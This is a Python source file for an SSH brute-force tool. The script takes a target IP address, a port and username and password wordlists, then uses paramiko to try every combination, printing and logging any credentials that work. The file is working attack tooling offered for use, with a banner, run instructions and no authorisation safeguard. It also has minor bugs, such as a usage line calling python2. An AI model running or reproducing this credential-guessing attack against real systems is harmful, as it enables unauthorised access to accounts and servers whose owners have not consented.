import argparse
import os
import sys
import logging
import ipaddress
import time
import paramiko
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from typing import TextIO, Union
from logging import NullHandler

"""
Script Usage
----------------------------------------------------------
# Execute the following commands at the terminal
- python -m venv sshbrute_env
- source sshbrute_env/bin/activate
- pip3 install -r sshbrute_requirements.txt

# After the required Python modules are installed, execute the following:
- python2 ssh-brutefource.py [host_ipv4] [host_port] [path/username.txt] [path/password.txt]

# NOTES:
- All logging and error information stored in the 'ssh_bruteforce.log' file within directory executing this script.
- Script tested on Ubuntu, Debian, and Kali, and ideally does not require root/elevated privileges.
"""
ascii_art = r"""
  ====== ==    == ======  ======= ======  ======= =======  ======  ======  ======  ======  ========    ======  ==       =====   ====== ==   == 
 ==       ==  ==  ==   == ==      ==   == ==      ==      ==      ==      ==    == ==   ==    ==       ==   == ==      ==   == ==      ==  ==  
 ==        ====   ======  =====   ======  ======= =====   ==      ==      == == == ======     ==       ======  ==      ======= ==      =====   
 ==         ==    ==   == ==      ==   ==      == ==      ==      ==      == == == ==         ==       ==   == ==      ==   == ==      ==  ==  
  ======    ==    ======  ======= ==   == ======= =======  ======  ======  = ====  ==         ==    == ======  ======= ==   ==  ====== ==   == 
"""


class Colors:
    RED   = '\033[31m'
    GREEN = '\033[32m'
    CYAN  = '\033[36m'
    BLUE  = '\033[34m'
    RESET = '\033[0m'

# Logging to file & console
logging.basicConfig(
	level=logging.INFO,
	format='%(asctime)s - %(levelname)s - %(message)s',
	handlers=[
		logging.FileHandler("ssh_bruteforce.log"),
        logging.StreamHandler(sys.stdout)
	]
)

# File Check Utility - check if file is plaintext
def is_plain_text(filepath: str) -> bool:
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            chunk = f.read(1024)
            if '\x00' in chunk: # Likely a binary file
                logging.error(f)
                return False
        # No decoding error and no null bytes, assume plain text
        return True
    except UnicodeDecodeError: # If UTF-8 decoding failed, likely not plain text
        return False
    except Exception as e:
          logging.error(f" Error checking file type for {filepath}: {e}")
          return False

# IP Address Utility - check if valid ip address submitted
def is_valid_ip(address: str) -> bool:
    try:
        ipaddress.IPv4Address(address)
        return True
    except ValueError:
        logging.error(f"Error invalid IPv4 address submitted")
        return False

# Port Utility - check if valid port submitted (Union - accepts int or string)
def is_valid_port(port: Union[int, str]) -> bool:
    try:
        port_int = int(port)
    except (TypeError, ValueError):
        logging.error(f"Error invalid port value submitted")
        return False
    return 1 <= port_int <65535

# SSH connection
def ssh_connect(host, port, username, password) -> bool:

    ssh_client = paramiko.SSHClient()
    # Set Host Policies (add new host name & key to the local Hostkeys object)
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    try:
        # Initiate SSH connection with
        # Uncomment next line (& comment subsequent line) to adjust timeout settings
        #ssh_client.connect(host, port, username=username, password=password, banner_timeout=30, auth_timeout=5)
        ssh_client.connect(host, port, username=username, password=password)
        # No exception indicates valid credentials
        return True
    except AuthenticationException:
        #print(f"[X] Invalid credentials: {username}-{password}")
        print(Colors.RED+"[X]"+Colors.RESET+"Invalid credentials: "+username+"-"+password)
        return False
    except ssh_exception.SSHException:
        logging.error("Attempting to connect - Rate limiting on server")
        return False
    finally:
        if ssh_client:
            ssh_client.close()
        
	
def main():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())

    print(Colors.BLUE+ascii_art+Colors.RESET)

    print("\n" + "="*50)
    print("           PYTHON SSH Brute Force Script")
    print("" + "="*50)
    logging.info("SSH bruteforce script execution started")
    print("")

    # Check if all 4 variables submitted: host, port, username_file, & password_file
    parser = argparse.ArgumentParser(
        description="SSH Credential Brute Force Script - Cyber Sec C@pt.Blackb3ard",
        formatter_class=argparse.RawTextHelpFormatter
	)
    parser.add_argument("host", help="Host IPv4 Address")
    parser.add_argument("port", help="Host SSH Port")
    parser.add_argument("usernames", help="Usernames file list")
    parser.add_argument("passwords", help="Passwords file list")
    args = parser.parse_args()

	# args.host, args.port, args.username, args.passwords
     
	# Check Host IPv4 and Port values
    if not is_valid_ip(args.host):
        logging.error(f"Error - Invalid host IPv4 value submitted: {args.host}")
        sys.exit(1)
    if not is_valid_port(args.port):
        logging.error(f"Error - Invalide port value submitted: {args.port}")
        sys.exit(1)

	# Check if files exists & plain_text
    for fpath in [args.usernames, args.passwords]:
        if not os.path.exists(fpath):
            logging.error(f"Error - Required file not found: {fpath}")
            sys.exit(1)
        if not is_plain_text(fpath):
            logging.error(f"Error - File is not a plain text file or could not be read: {fpath}")
            sys.exit(1)
	
    # Capture valid creds
    valid_creds = {}
	# Track number credential combinatons
    cred_count = 1
    # TODO: Add code to output progress percentage
    
    try:
        with open(args.usernames, 'r', encoding='utf-8') as ufile, \
             open(args.passwords, 'r', encoding='utf-8') as pfile:

            #start performance tracking
            start = time.perf_counter()

            logging.info(f"Processing username(s) file: {args.usernames}")
            logging.info(f"Process passwords file: {args.passwords}\n")

            for out_index, line1 in enumerate(ufile, start=1):
                uname = line1.strip()

                # Rewind password file for each new line from file 1
                pfile.seek(0)

                for inner_index, line2 in enumerate(pfile, start=1):
                    passwd = line2.strip()
                    print(f"[{cred_count}] Attempting to connect to {args.host}:{args.port} with credentials {uname} + {passwd}")
                    # Pass to SSH connect
                    if ssh_connect(args.host, args.port, uname, passwd):
                        valid_creds[uname] = passwd
                    # Leave time between starting a new connection
                    #time.sleep(6)
                    
                    cred_count += 1

            # Log process for large files
            if out_index % 1000 == 0:
                 logging.info(f"Processed {out_index} lines from the username file")

            if valid_creds:
                #print(valid_creds)
                for username, password in valid_creds.items():
                    print("\n"+Colors.GREEN+"[>]"+Colors.RESET+" Success, valid credentials found: Username - "+Colors.CYAN+username+Colors.RESET+" and Password - "+Colors.CYAN+password+Colors.RESET+"\n")
                    logging.info(f"Valid credentials ({username}-{password}) added to log file")
            
            # Stop performace tracking
            end = time.perf_counter()
            elapsed_time = end - start

            logging.info(f"Execution complete: {cred_count - 1} credential combinations in {elapsed_time:.4f} seconds.")

    except Exception as e:
        logging.critical(f"A critical error occurred during execution: {e}")
        sys.exit(1)

if __name__ == "__main__":
     main()